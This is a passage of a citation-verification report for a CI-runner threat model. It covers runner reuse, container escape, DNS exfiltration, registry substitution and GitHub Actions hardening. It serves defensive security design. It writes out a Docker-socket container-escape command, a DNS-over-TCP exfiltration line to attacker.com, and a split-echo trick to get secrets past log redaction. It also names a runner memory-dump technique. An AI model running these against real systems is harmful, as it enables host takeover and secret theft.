  https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html
  ("GitHub Actions Security", OWASP Cheat Sheet Series). Live and current.
Confirmed sections (fetched): treat CI/CD as critical production code; assume
failure + IR plan (it explicitly cites the Trivy post-mortem
https://github.com/aquasecurity/trivy/discussions/10462 and the Cline post-mortem);
enable CodeQL + Zizmor static analysis; harden repo settings (Require approval for
all external contributors; restrict default GITHUB_TOKEN); restrict egress
(Harden-Runner); use self-hosted runners with extra caution (ephemeral/container
runners, destroy after job, runner groups/labels); maintain curated shared
workflows; prevent artifact poisoning (cites Adnan Khan's cache-poisoning post;
"disable all caching in release/publishing workflows"); be careful with AI
assistants in CI (cites "clinejection"); avoid pull_request_target/workflow_run;
pin actions by commit hash + check for impostor commits (Zizmor impostor-commit
rule); minimize GITHUB_TOKEN; ::add-mask::; actions/checkout with
persist-credentials: false; OIDC/trusted publishing over static creds.
Cross-corroboration note: the OWASP sheet independently links to the Trivy, Cline,
Adnan-Khan, and Harden-Runner items in this same model — four independent
authoritative sources converging on the same failure modes is strong validation
that Round 1's top-10 is well-chosen.

=====================================================================
SECTION 6 — RUNNER REUSE / STATE CONTAMINATION
=====================================================================

--- 6a. GitLab Runner security docs ---
VERDICT: VERIFIED (URL path corrected)

Correct live URL (confirmed):
  https://docs.gitlab.com/runner/security/  ("Security for self-managed runners")
Correction: the path implied in Round 1 / common guess,
  https://docs.gitlab.com/ee/ci/runners/security.html
returns a transport error / does not resolve. The canonical current location is
docs.gitlab.com/runner/security/.
Confirmed content (fetched):
  - "Any user that has the Developer role ... could compromise the security of the
    environment hosting the runner ... This risk is even more acute if your
    self-managed runners are non-ephemeral and used for multiple projects."
  - Non-ephemeral runner: a malicious job can compromise other repos; steal
    CI_JOB_TOKEN; install malicious code on the VM; Developer-role submodule exposure.
  - Shell executor = highest risk (runs as runner user, can steal other projects'
    code); Docker executor safe in non-privileged mode; privileged mode = full root
    on the host (mount/detach volumes, nested containers, container breakout); host
    PID namespace breaks isolation; recommend MaxBuilds = 1 for Docker Machine.
  - Network segmentation; secure the runner host (remove SSH keys); FF_ENABLE_JOB_CLEANUP
    to clean .git / build dir after each build.
  - Hosted runners (https://docs.gitlab.com/ci/runners/hosted_runners/): ephemeral
    VMs, single job each, deleted immediately, outbound-only firewall, no VM-to-VM comms.

--- 6b. Safeguard — "What hidden state does a long-lived CI agent hold" ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://safeguard.sh/resources/blog/what-hidden-state-does-a-long-lived-ci-agent-hold
  ("What hidden state does a long-lived CI agent hold that you will lose?",
   Safeguard Security Team, October 19, 2026)
Confirmed content: long-lived agent holds five kinds of state — installed tools,
dependency/layer caches, stored credentials (home-dir dotfiles, .docker/config.json,
.ssh), workspace leftovers, local logs (+ background services/cron). Ephemeral
runners discard all; "some of that loss is a security win."
  - Explicitly cross-references GitLab's runner security guidance: don't docker login
    as the runner user on shared runners because "every credential kept in the runner
    host's configuration files is available to every job the runner executes."
  - Provides a keep / replace / drop decision framework for migrating to ephemeral.
Companion (fetched):
  https://safeguard.sh/resources/blog/ephemeral-ci-migration-readiness-checklist (2026-10-19)

--- 6c. runs-on.com — ephemeral vs long-lived runners ---
VERDICT: VERIFIED (serves both section 6 and section 10)

Exact URL (fetched & confirmed):
  https://runs-on.com/blog/ephemeral-vs-long-lived-runners/
Confirmed content: the core framing — a long-lived runner "carries all of that from
one job to the next": filesystem/caches (Docker layer store, ~/.npm, ~/.cargo,
Gradle/Maven, /tmp — a poisoned cache entry is inherited by every later job),
credentials (a job that writes ~/.docker/config.json / deploy key leaves it readable
to the next job, possibly a different PR), orphaned processes/ports, resource drift
(ENOSPC, OOM), agent/toolchain drift. It quotes GitHub's own warning: self-hosted
runners only with private repos because "forks of your public repository can
potentially run dangerous code ... by creating a pull request." It frames ephemeral
runners as pure functions (same job run twice -> same state twice) and the security
boundary collapsing to a single job.
Company context (fetched): RunsOn is an ephemeral-runner product;
  https://runs-on.com/security/ states "runner VMs are ephemeral and isolated by
  default" and "it always spawns a new runner for each workflow run" — i.e., the
  product position IS the mitigation for this exact failure mode.

=====================================================================
SECTION 7 — HOST FILESYSTEM ESCAPE
=====================================================================

--- 7a. Docker socket mount escape — maxuru.com (and/or safeguard.sh) ---
VERDICT: VERIFIED (maxuru.com confirmed; the "and/or safeguard.sh" alternative not needed)

Exact URL (fetched & confirmed):
  https://maxuru.com/docker/container-escape/  ("Docker container escape | Maxuru")
Confirmed content (the exact technique, verbatim command): a container with
/var/run/docker.sock mounted can ask the (root) daemon to start a second container
with / mounted:
    # from inside the container that has the socket
    docker run -v /:/host --privileged -it alpine chroot /host sh
  -> host root. "The 'escape' is an API call." Maxuru explicitly states this is not
  a bug/CVE ("patching cannot help you here, and no CVE will ever be filed") — it's
  a handed-away boundary, which is why no CVE number is associated (correct framing).
Also confirmed on the page: --privileged (mount host disk, write authorized_keys);
docker group == root on the host ("the docker group is the wheel group"); host
namespaces (--pid=host, --net=host -> cloud metadata 169.254.169.254 -> IAM creds);
detection one-liners (docker inspect ... | grep docker.sock); and the structural fix =
rootless mode (https://maxuru.com/docker/rootless-mode/) so "a container escape lands
as you, not as root."
Safeguard.sh alternative: not required — maxuru fully covers the claim.
Why it matters for OpenForge: any runner that builds/inspects images or runs
containers needs the daemon; mounting the daemon socket into an untrusted job =
instant host root. The Trivy incident (4b) explicitly warned Trivy containers with a
mounted socket = "treat the entire host as compromised." First-class design
constraint: never expose the Docker daemon socket to untrusted job execution; use a
rootless daemon + per-job namespace.

--- 7b. CVE-2022-0492 (cgroups v1 release_agent) ---
VERDICT: VERIFIED — see 1d. (Round 1 correctly noted it's shared with section 1;
no separate verification needed. Re-confirmed via NVD + CISA KEV 2026-06-02.)

=====================================================================
SECTION 8 — NETWORK EGRESS EXFILTRATION
=====================================================================

--- 8a. CVE-2026-32946 — Harden-Runner "DNS channel" (DNS over TCP) ---
VERDICT: CVE VERIFIED / "SentinelOne" attribution REFUTED

CVE confirmed:
  https://api.github.com/advisories?cve_id=CVE-2026-32946  -> GHSA-g699-3x6g-wm3g
  ("Egress Policy Bypass via DNS over TCP in Harden-Runner (Community Tier).")
  Published 2026-03-17; CVSS 4.6 Medium; CWE-693/CWE-863. Affected <= 2.15.1; fixed 2.16.0.
  Human URL: https://github.com/advisories/GHSA-g699-3x6g-wm3g
  Repo advisory: https://github.com/step-security/harden-runner/security/advisories/GHSA-g699-3x6g-wm3g
What it is (confirmed): with egress-policy: block + a restrictive allowed-endpoints
list, Harden-Runner does not adequately restrict DNS-over-TCP;
  dig <data>.attacker.com @8.8.8.8 +tcp
bypasses the whole policy (DNS over TCP/UDP on 53 is allowed through). Requires
pre-existing code execution in the workflow; Community Tier only.
The "SentinelOne URL" claim is REFUTED: there is no SentinelOne writeup for this
CVE. The primary/authoritative sources are step-security (the GHSA + the v2.16.0
release notes: https://github.com/step-security/harden-runner/releases/tag/v2.16.0)
and the original researcher's disclosure: Devansh Batham, "More egress filtering
bypasses in harden-runner", https://devansh.bearblog.dev/harden-runner-bypass/
(2026-03-15) — who discovered both bypasses and is credited in the GHSA.
Replace "SentinelOne URL" with the step-security GHSA + devansh.bearblog.dev.

--- 8b. CVE-2026-32947 — Harden-Runner (DNS over HTTPS / DoH exfiltration) ---
VERDICT: CVE VERIFIED / "SentinelOne" attribution REFUTED

CVE confirmed:
  https://api.github.com/advisories?cve_id=CVE-2026-32947  -> GHSA-46g3-37rh-v698
  ("Egress Policy Bypass via DNS over HTTPS (DoH) in Harden-Runner (Community Tier).")
  Published 2026-03-17; CVSS 4.6 Medium; CWE-693/CWE-863. Affected <= 2.15.1; fixed 2.16.0.
  OSV: https://osv.dev/vulnerability/CVE-2026-32947
What it is (confirmed): wraps DNS queries inside HTTPS to a permitted resolver
(e.g., dns.google/dns-query); the exfil data is encoded in the subdomain label;
Harden-Runner sees a legit HTTPS connection to an allowed domain and never inspects
the payload -> exfil without touching any blocked destination. This is the stronger
of the two (DoH is the real covert channel; DNS-over-TCP is the easier one-liner).
Same discoverer (Devansh Batham) and same fix (2.16.0).
Same attribution correction: step-security GHSA + devansh.bearblog.dev, not SentinelOne.
(Devansh's blog also lists a third related ID, CVE-2026-25598, in the same
disclosure — see ADDITIONS #4.)

--- 8c. UNSW TNSM 2019 — DNS tunneling paper ---
VERDICT: VERIFIED

Confirmed (fetched): two tightly-related UNSW 2019 papers, both on DNS
exfiltration/tunneling detection:
  1. IEEE TNSM 2019 (the "TNSM 2019" the claim cites):
     "Monitoring Enterprise DNS Queries for Detecting Data Exfiltration From
      Internal Hosts" — Jawad Ahmed, Hassan Habibi Gharakheili, Qasim Saleem Raza,
      Craig Russell, Vijay Sivaraman.
     DOI: 10.1109/tnsm.2019.2940735  (https://doi.org/10.1109/tnsm.2019.2940735)
     Published 2019-09-11.
  2. IFIP/IEEE IM 2019 (16th IFIP/IEEE Symposium on Integrated Network and Service
     Management): "Real-Time Detection of DNS Exfiltration and Tunneling from
     Enterprise Networks" — same team.
     PDF: https://www2.ee.unsw.edu.au/~hhabibi/pubs/conf/19im.pdf
     Companion APNIC blog: https://blog.apnic.net/2019/06/24/real-time-detection-of-dns-exfiltration/
     (98% accuracy, isolation-forest ML, 10 Gbps live UNSW-campus + CSIRO/Data61 streams.)
Relevance confirmed: both establish that DNS is a viable covert egress channel
(firewalls allow UDP/TCP 53 without inspection) and that it is detectable at the
enterprise edge via ML on query features — i.e., the academic basis for "DNS egress
is a real exfil path AND a real detection surface" in the threat model.

--- 8d. MDPI Sensors — cloud DNS tunneling (claim: "2022") ---
VERDICT: VERIFIED-WITH-CORRECTION (publication year is 2023, not 2022)

Exact URL (fetched & confirmed):
  https://www.mdpi.com/1424-8220/23/5/2760
  "DNS Tunnelling, Exfiltration and Detection over Cloud Environments" —
  Lehel Salat, Mastaneh Davis, Nabeel Khan.
  Sensors (MDPI), 2023, 23(5), 2760. DOI: 10.3390/s23052760.
  PubMed: https://pubmed.ncbi.nlm.nih.gov/36904959/
Correction: the claim said "Sensors 2022." The paper was submitted 30 Sep 2022 but
published 2 March 2023 (Sensors vol. 23, issue 5). So "2022" is the submission year;
the citable publication is 2023. Use 2023 / vol 23(5) 2760.
Confirmed relevance: demonstrates Iodine and DNScat tunneling + exfil successfully in
cloud (GCP + AWS) environments under various firewall configs — including the notable
finding that even with all egress blocked, GCP's VPC metadata server still resolves
DNS, so a tunnel can be established. Detection via an Elastic-stack DNS monitoring
system. Directly on-point for "cloud CI runners can exfil over DNS even under egress
block" and complements 8a/8b (Harden-Runner) and 8c (UNSW).

=====================================================================
SECTION 9 — REGISTRY / IMAGE SUBSTITUTION
=====================================================================

--- 9a. Sysdig — TOCTOU tag mutability (2020) ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://www.sysdig.com/blog/toctou-tag-mutability
  ("Attack of the mutant tags! Or why tag mutability is a real security threat",
   Álvaro Iradier, June 23, 2020 — claim's "2020" is correct)
Confirmed content: the TOCTOU where the image verified at scan/admission time differs
from the image deployed — an attacker pushes a malicious image under the same mutable
tag (e.g., myimage:latest) after the scan passes, so the admission controller (OPA
Gatekeeper / OPA image scanner) admits a poisoned image. Mitigations: immutable tags /
digests (image@sha256:), and Sysdig's mutating admission controller that rewrites the
pod spec to the scanned digest (also see https://github.com/sysdiglabs/opa-image-scanner).
Why it matters: this is the generic form of the Trivy/KICS 2026 incidents (4b/4c) —
those are the real-world, credential-theft realizations of exactly this "mutable tag +
TOCTOU" class. Tag mutability is the substrate; stolen publisher creds are the weapon.

--- 9b. USENIX Security 2022 — typosquatting paper ---
VERDICT: VERIFIED

Exact URL (fetched & confirmed):
  https://www.usenix.org/conference/usenixsecurity22/presentation/liu-guannan
  "Exploring the Unchartered Space of Container Registry Typosquatting" —
  Guannan Liu (Virginia Tech), Xing Gao (Univ. of Delaware), Haining Wang
  (Virginia Tech), Kun Sun (George Mason Univ.).
  31st USENIX Security Symposium, 2022, pp. 35-51.
  Slides: https://www.usenix.org/system/files/sec22_slides-liu_guannan.pdf
Confirmed content: first in-depth study of container-registry typosquatting;
measurement on 416,087 Docker Hub + 21,409 Quay.io repos; 75,312 typosquat username
pairs on Docker Hub; 210-day PoC uploading 4,787 malicious images that attracted
40,009 pulls; shows public and private registries (open naming space) and
cross-platform (self-hosted malicious registries) are exploitable; proposes CRYSTAL
(a lightweight image-management extension, >97.5% detection accuracy).
Note (add to model, adjacent but distinct): companion 2023 paper "Beyond
Typosquatting: An In-depth Look at Package Confusion" (Neupane et al., USENIX
Security 2023, https://www.usenix.org/conference/usenixsecurity23/presentation/neupane)
— 13 categories of package-confusion mechanisms. Worth citing as the npm-side extension.

--- 9c. CVE-2026-85747 ---
VERDICT: VERIFIED

Confirmed:
  https://api.github.com/advisories?cve_id=CVE-2026-85747  -> GHSA-685w-q87j-wqw3
  "Distribution: Client manifests.Get() does not verify returned content against
   requested digest."
  Human URL: https://github.com/advisories/GHSA-685w-q87j-wqw3
  Repo advisory: https://github.com/distribution/distribution/security/advisories/GHSA-685w-q87j-wqw3
  Published 2026-10-15; CVSS 3.1 6.8 Medium (AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N); CWE-354.
Confirmed content: registry/client.(*manifests).Get(ctx, dgst, ...) in
docker/distribution (registry/client/repository.go:488-505) reads the response body
and passes it to distribution.UnmarshalManifest without ever hashing the body and
comparing to the requested digest. A malicious/compromised registry (or TLS MITM)
serving a forged Docker-Content-Digest header + different body causes the client to
accept substituted manifest bytes transparently. The bundled pull-through proxy
(registry/proxy/proxymanifeststore.go) is an unguarded consumer and is directly
exploitable (a poisoned remote permanently injects a bad manifest into the mirror
cache). Full PoC in the advisory.
Fix / affected: github.com/distribution/distribution/v3 < 3.1.2 (fixed in v3.1.2);
github.com/docker/distribution <= 2.8.3 (legacy, unpatched).
Why it's the perfect section-9 anchor: this is a digest-pinning bypass — it proves
that even content-addressed integrity is broken if the client doesn't re-hash, which
is a subtler and more damaging flaw than tag mutation (9a). OpenForge's image puller
MUST independently recompute and verify the manifest/layer digests from the bytes it
actually received; never trust the Docker-Content-Digest header alone. A pull-through
cache/mirror (which OpenForge will likely run) is explicitly in the blast radius.

=====================================================================
SECTION 10 — EPHEMERAL VS PERSISTENT RUNNER CONFUSION
=====================================================================

--- 10a. runs-on.com — ephemeral vs long-lived ---
VERDICT: VERIFIED — see 6c (same source serves both).
  https://runs-on.com/blog/ephemeral-vs-long-lived-runners/ confirmed; the
  confusion it warns against (treating a long-lived runner's leftover state as
  "just operational detail") is the core point.

--- 10b. GitHub docs on compromised runners ---
VERDICT: VERIFIED

Primary (fetched & confirmed):
  https://docs.github.com/en/actions/concepts/security/compromised-runners  ("Compromised runners")
Self-hosted runner warning (fetched & confirmed):
  https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/add-runners
  Verbatim: "We recommend that you only use self-hosted runners with private
   repositories. This is because forks of your public repository can potentially
   run dangerous code on your self-hosted runner machine by creating a pull request
   that executes the code in a workflow."
Secure use reference (fetched & confirmed):
  https://docs.github.com/en/actions/reference/security/secure-use
  "Self-hosted runners ... do not have guarantees around running in ephemeral clean
   virtual machines, and can be persistently compromised by untrusted code ... a
   security compromise ... can result in a wide impact" (org/enterprise-level runners
   shared across repos); secrets as CLI args visible via ps x -w; "you should always
   be mindful that any user capable of invoking workflows has access to this environment."
Confirmed "Accessing secrets" detail (the section 3 / section 8 bridge): on a
compromised runner, GITHUB_TOKEN + referenced secrets are harvestable via printenv
(env) or the on-disk generated .sh (expressions); custom actions vary; "Although
GitHub Actions scrubs secrets from memory that are not referenced ... the
GITHUB_TOKEN and any referenced secrets can be harvested by a determined attacker."
And "GitHub Actions automatically redact secrets printed to the log, but this is not
a true security boundary because secrets can be intentionally sent to the log"
(e.g., echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200}), or sent out over HTTP.

=====================================================================
ADDITIONS — REAL 2025-2026 ITEMS Round 1 MISSED (add to the threat model)
=====================================================================

These were surfaced during verification and are directly relevant, current, and
high-value. None are speculative; each has a confirmed source.

1. CVE-2025-30154 — reviewdog/action-setup (March 2025). The enabler of the
   tj-actions compromise; Round 1 cited only CVE-2025-30066. CISA explicitly names
   it and five other affected reviewdog actions. CISA alert (same URL as 4a) covers
   both. -> Add as the "the compromise you're investigating is usually the second
   hop" pattern.

2. CVE-2023-36052 — Azure CLI REST command information disclosure (Nov 2023,
   Critical). Round 1 cited the MSRC blog but not the CVE. It is the canonical
   "cloud CLI prints secrets to CI log" CVE. -> Add the CVE ID next to 3a.

3. CVE-2026-33634 — Trivy (March 2026). Round 1 cited the Docker blog but not the
   CVE. -> Add the CVE ID next to 4b.

4. CVE-2026-25598 (referenced in Devansh Batham's disclosure,
   https://devansh.bearblog.dev/harden-runner-bypass/). A third Harden-Runner
   egress-bypass CVE in the same 2026-03 disclosure family as 32946/32947. Round 1
   listed only the two. -> Verify/add; at minimum, note the Harden-Runner
   egress-bypass cluster is >= 3 CVEs, not 2.

5. Ultralytics PyPI supply-chain attack (2024) — a real-world cache-poisoning
   compromise (the Adnan Khan Cacheract post and the Socket cache-mode post both
   name it as the first in-the-wild cache-poisoning supply-chain attack). Round 1's
   section 2 listed the technique (Adnan Khan) and 2026 incidents but not this 2024
   in-the-wild one. -> Add.

6. The May 11-12, 2026 mass coordinated registry attack
   (SafeDep: https://safedep.io/blog/mass-npm-supply-chain-attack-tanstack-mistral).
   TanStack (42 pkgs) was part of a single coordinated campaign hitting 170+ npm
   packages + 2 PyPI (404 malicious versions total) across TanStack, Mistral AI
   (npm+PyPI), UiPath (65 pkgs), OpenSearch, Guardrails AI, and (Apr 23) Bitwarden
   CLI. Round 1 treated TanStack as a standalone cache-poisoning case; the scale and
   multi-ecosystem coordination matter for a platform threat model. -> Reframe
   TanStack as "the tip of the 2026 mini-Shai-Hulud."

7. GitHub's 2026 Actions platform-hardening timeline (from Wiz 5c + GitHub changelogs).
   This is arguably the single most important addition: OpenForge's self-hosted
   runner must match or exceed what GitHub now enforces by default, or it will be a
   downgrade for teams migrating. Confirmed milestones:
     2026-06-18 actions/checkout@v7.0.0 (block fork checkouts on untrusted triggers by default).
     2026-06-26 platform read-only cache tokens for untrusted triggers.
     2026-07-20 fork-checkout protection backported to v2.8.0/v3.7.0/v4.4.0/v5.1.0/v6.1.0.
     2026-09-10 cache-mode GA (read/write/write-only/none).
     2026-09-17 Workflow Execution Protections GA (event policies + actor rules).
     2026-12-02 (scheduled) default event policy blocks pull_request_target in public repos
       (private/internal + workflow_run exempt).
   -> Encode these as baseline control requirements for OpenForge, plus the Wiz-
   documented residual gaps (SHA-pin paradox, issue_comment/repository_dispatch,
   script-injection, non-ephemeral self-hosted state) as the places a greenfield
   platform can differentiate.

8. Adnan Khan "One Supply Chain Attack to Rule Them All — Poisoning GitHub's Runner
   Images" (Dec 20, 2023) —
   https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/
   Real disclosure: a critical misconfiguration in actions/runner-images (Feb-Jul
   2023) that could inject malicious code into all GitHub hosted-runner base images;
   explicitly uses Karim Rahal's memory-dump technique + non-ephemeral self-hosted
   runner + persist-credentials. -> Add as the "the platform's own runner-builder is
   a crown jewel" data point.

9. Safeguard + RunsOn positioning (2026-10) — both 6b/6c vendors now market
   ephemeral, per-job runners as the primary security control (not an operational
   nicety). This is a strong market-signal that "ephemeral-by-default" is becoming
   table stakes for self-hosted CI. -> Cite as competitive/design justification for
   OpenForge defaulting to ephemeral, per-job, namespace-isolated runners with no
   persistent daemon socket.

=====================================================================
CROSS-CUTTING COHERENCE FINDINGS (what the verification actually proved)
=====================================================================

1. One atomic secret-exfil primitive, reused everywhere.
   Karim Rahal (Jan 2023) established gcore / /proc/PID/mem dump of
   Runner.Listener / Runner.Worker -> all secrets + RW GITHUB_TOKEN. That exact
   primitive is the payload in: tj-actions (2025), Trivy (2026, /proc/PID/mem),
   TanStack (2026), and Cline (2026). The threat model should make this the #1
   "host process memory = secret vault" invariant and hard-block gcore, /proc/*/mem,
   /proc/*/environ, /proc/*/fd in every job sandbox.

2. Cache poisoning is the 2024 -> 2026 escalation bridge.
   Adnan Khan's technique (May 2024) -> Ultralytics in the wild (2024) -> Cacheract
   tool (Dec 2024) -> Cline + TanStack in the wild (2026) -> GitHub's controls
   (read-only cache tokens Jun 2026, cache-mode GA Sep 2026). This is a complete
   research -> exploit -> defense arc. OpenForge should (a) make cache keys
   unpredictable and per-actor, (b) default untrusted triggers to read-only cache,
   (c) never let a release/publish workflow restore a cache produced by a PR run,
   (d) treat a poisoned cache as a SLSA L3 violation (Adnan proved signed provenance
   still passes on a tampered cache restore).

3. "Stolen publisher credentials + mutable tag/digest" is the dominant 2026 supply-
   chain shape. Trivy (Mar 2026) and KICS (Apr 2026) are the same pattern twice:
   stolen creds -> repoint/push malicious content under a trusted name -> latest tag
   or digest-pinned-but-unre-verified pull. Sysdig TOCTOU (2020) + USENIX
   typosquatting (2022) + CVE-2026-85747 (2026, digest re-verification bypass) are the
   theory layer. OpenForge's registry must: enforce immutable tags / digest-only
   pulls, re-hash manifest + layer bytes client-side (never trust Docker-Content-
   Digest), verify signatures/provenance attestations, and pin publisher identity
   (not just name).

4. The pwn-request class is being closed at the platform layer (GitHub) but not
   eliminated — and a greenfield platform that simply copies GitHub's old defaults
   will be worse than the new defaults. Wiz (Oct 2026) + GitHub changelogs give the
   exact list of what "good" looks like now.

5. Host-escape vectors are mostly configuration, not CVEs (maxuru, GitLab docs,
   GitHub secure-use): Docker socket mount, --privileged, host PID/net namespaces,
   non-root daemon. The two genuine container-runtime CVEs (5736, 21626) plus the
   kernel cgroups v1 bug (0492, now KEV) are the "even if you configure correctly,
   patch the runtime" layer. Both layers are required.

6. Egress is the leak that survives everything else. Even with a perfect sandbox, an
   attacker with code execution can exfil over DNS (UNSW 2019, MDPI 2023 cloud,
   Harden-Runner CVEs 32946/32947) or plain HTTP. The model must treat egress
   allowlisting as a first-class, enforced control — and note the 2026 lesson that
   domain-based egress filtering is itself bypassable via DNS-over-HTTPS/TCP, so
   egress enforcement needs to be at the connection + protocol level, not just
   destination-domain level.

7. Round 1's factual errors are all "detail-precision" errors, not hallucinations.
   The three genuine errors (CVE-2024-21627 mis-identified; two "SentinelOne"
   attributions; a few dates/URL-paths) are exactly the kind of thing that looks
   authoritative but breaks under citation. The corrected identifiers above should
   be the ones shipped in OpenForge's threat-model doc, because a threat model that
   cites the wrong CVE or wrong vendor will fail peer review and won't map to a
   scanner's CVE feed.

=====================================================================
CORRECTED CITATION SHEET (ship these, not Round 1's raw strings)
=====================================================================

Sandbox escape (runtime CVEs):
  CVE-2019-5736   runc /proc/self/exe   Docker <18.09.2 / runc <1.0-rc8   https://nvd.nist.gov/vuln/detail/CVE-2019-5736
  CVE-2024-21626  runc cwd+fd (Leaky Vessels)  runc <1.1.12 / containerd <1.7.13,1.6.28  https://nvd.nist.gov/vuln/detail/CVE-2024-21626
                  Snyk: https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/
  CVE-2022-0492   cgroups v1 release_agent  CISA KEV 2026-06-02          https://nvd.nist.gov/vuln/detail/CVE-2022-0492
  REMOVE: "CVE-2024-21627 Leaky Vessels"  -> it is PrestaShop XSS, https://nvd.nist.gov/vuln/detail/CVE-2024-21627

Cache poisoning:
  Adnan Khan (2024-05-06)   https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
  Cacheract (2024-12)       https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/
  TanStack (2026-05-11)     https://tanstack.com/blog/npm-supply-chain-compromise-postmortem  +  https://safedep.io/blog/tanstack-github-actions-cache-poisoning
  Cline (2026-02)           https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm  +  https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/  (GHSA-9ppg-jx86-fqw7)
  Socket cache-mode (2026-09-16, mitigation)  https://socket.dev/blog/github-actions-cache-mode
  Ultralytics PyPI (2024)   [in-the-wild; cited by the two above]

Secret leakage via logs / memory:
  MSRC Azure CLI (2023-11-14) + CVE-2023-36052  https://www.microsoft.com/en-us/msrc/blog/2023/11/microsoft-guidance-regarding-credentials-leaked-to-github-actions-logs-through-azure-cli
  Karim Rahal (2023-01-05)  https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/
  tj-actions CVE-2025-30066 (2025-03-14/15) + enabler CVE-2025-30154  GHSA-mrrh-fwg8-r2c3
       CISA: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction

Supply chain (marketplace / images):
  Trivy (2026-03) + CVE-2026-33634  https://www.docker.com/blog/trivy-supply-chain-compromise-what-docker-hub-users-should-know/  (GHSA-69fq-xp46-6x23)
  KICS/Checkmarx (2026-04-22)       https://www.docker.com/blog/trivy-kics-and-the-shape-of-supply-chain-attacks-so-far-in-2026/  +  https://checkmarx.com/blog/ongoing-security-updates/
  Mass 2026 campaign                https://safedep.io/blog/mass-npm-supply-chain-attack-tanstack-mistral

Pwn request:
  GHSL (2021-08-03)   https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
  GHSL-2024-030 docfx https://securitylab.github.com/advisories/GHSL-2024-030_dotnet_docfx/
  Wiz (2026-10-26)    https://www.wiz.io/blog/github-actions-security-pwn-request-reckoning
  OWASP cheat sheet   https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html

Runner state / host escape:
  GitLab runner security  https://docs.gitlab.com/runner/security/
  Safeguard hidden state  https://safeguard.sh/resources/blog/what-hidden-state-does-a-long-lived-ci-agent-hold
  RunsOn ephemeral vs long-lived  https://runs-on.com/blog/ephemeral-vs-long-lived-runners/
  Docker socket escape  https://maxuru.com/docker/container-escape/   (rootless: https://maxuru.com/docker/rootless-mode/)

Egress exfiltration:
  CVE-2026-32946  Harden-Runner DNS-over-TCP   GHSA-g699-3x6g-wm3g  (step-security; discloser devansh.bearblog.dev/harden-runner-bypass/)
  CVE-2026-32947  Harden-Runner DoH exfil       GHSA-46g3-37rh-v698  (same)
  UNSW TNSM 2019  https://doi.org/10.1109/tnsm.2019.2940735  (+ IM 2019: https://www2.ee.unsw.edu.au/~hhabibi/pubs/conf/19im.pdf)
  MDPI Sensors 2023 (submitted 2022)  https://www.mdpi.com/1424-8220/23/5/2760  (DOI 10.3390/s23052760)

Registry / image substitution:
  Sysdig TOCTOU tag mutability (2020-06-23)  https://www.sysdig.com/blog/toctou-tag-mutability
  USENIX Sec 2022 typosquatting  https://www.usenix.org/conference/usenixsecurity22/presentation/liu-guannan
  CVE-2026-85747  distribution digest re-verify bypass  GHSA-685w-q87j-wqw3  (fixed v3.1.2)

Ephemeral vs persistent:
  GitHub compromised runners  https://docs.github.com/en/actions/concepts/security/compromised-runners
  GitHub self-hosted warning  https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/add-runners
  GitHub secure-use reference https://docs.github.com/en/actions/reference/security/secure-use

=====================================================================
NET VERDICT ON ROUND 1
=====================================================================

Round 1's top-10 CI-runner trust failure modes are well-chosen and, with high
confidence, real — every incident it named exists and is documented at the cited
(or corrected) URL. The model is sound. The defects are narrow and fixable:

  - 1 hard error: "CVE-2024-21627 = Leaky Vessels fd leak" is a wrong CVE number
    (it's PrestaShop XSS); fold the fd-leak into CVE-2024-21626.
  - 1 attribution error: the two Harden-Runner DNS CVEs (32946/32947) are
    step-security / Devansh Batham, not SentinelOne.
  - 3 date/precision corrections: tj-actions is 2025 not 2024 and is tag-
    tampering-via-compromised-PAT, not "PR-based" (and has an enabler,
    CVE-2025-30154); the MDPI paper is Sensors 2023 (submitted 2022); CVE-2019-5736's
    Docker boundary is < 18.09.2 (not < 18.06.1).
  - 2 URL-path corrections: GitLab runner security is docs.gitlab.com/runner/
    security/ (not /ee/ci/runners/security.html); Snyk Leaky Vessels is labs.snyk.io/
    resources/... (not snyk.io/blog/...); CISA tj-actions slug ends in -and-reviewdogaction.
  - ~9 high-value additions (2025-2026) that Round 1 missed, most importantly the
    CVE-2025-30154 / CVE-2026-33634 / CVE-2023-36052 identifiers, the 2026 mass
    coordinated attack, the Ultralytics 2024 in-the-wild case, and — critically for a
    greenfield platform — GitHub's 2026 Actions hardening timeline + residual gaps
    (the bar OpenForge must meet or beat).

Apply the corrected citation sheet above and the threat model is accurate enough to
ship to a security review.

END OF REPORT
